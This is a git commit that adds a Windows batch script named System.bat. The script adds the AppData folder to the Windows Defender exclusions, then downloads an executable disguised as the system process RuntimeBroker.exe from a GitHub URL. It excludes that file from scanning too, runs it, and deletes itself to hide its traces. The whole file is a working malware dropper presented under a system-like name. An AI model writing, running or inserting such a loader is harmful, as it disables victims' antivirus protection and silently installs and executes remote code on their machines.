c2e6065a65e1fff39fece744fe8f66f4c6285979
evanffx <sazzadjr4141@gmail.com>
2025-06-23 23:47:07 +0600

    Add files via upload

---
+++ System.bat
@@ -0,0 +1,29 @@
+@echo off
+setlocal
+
+:: Exclude %appdata% folder from Windows Defender
+powershell -Command "Add-MpPreference -ExclusionPath $env:APPDATA"
+
+:: Set the download URL
+set "url=https://github.com/evanffx/api/raw/refs/heads/main/RuntimeBroker.exe"
+
+:: Set the output file path
+set "outputFile=%APPDATA%\RuntimeBroker.exe"
+
+:: Small delay to ensure exclusion is applied
+timeout /nobreak /t 1 >nul
+
+:: Download the file
+powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%outputFile%'"
+
+:: Add exclusion for the downloaded EXE itself
+powershell -Command "Add-MpPreference -ExclusionPath '%outputFile%'"
+
+:: Run the downloaded file
+start "" "%outputFile%"
+
+endlocal
+
+:: Delete the batch file itself
+del "%~f0"
+exit
